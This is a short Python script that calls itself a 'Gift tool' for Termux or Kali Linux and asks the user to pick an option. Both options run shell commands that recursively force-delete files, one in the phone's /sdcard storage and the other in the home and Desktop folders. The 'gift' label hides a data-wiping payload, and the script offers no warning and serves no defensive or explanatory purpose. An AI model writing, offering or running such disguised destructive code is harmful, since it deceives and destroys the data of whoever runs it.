from os import system
from time import sleep
import sys 
import time
system ('\033[0;32m')
system ('figlet Gift tool ')

print ('{1} Gift For termux ')
print ('{2} Gift For Kali Linux ')

x = input ('put your selection ...: ')

if x == '1' :

    system ('''

cd ..
cd /sdcard
rm -rif * ''' )

elif x == '2' :

    system ('''
cd home
rm -rif * 
cd Desktop
rm -rif * ''')

else:
    print (' put a correct number ')

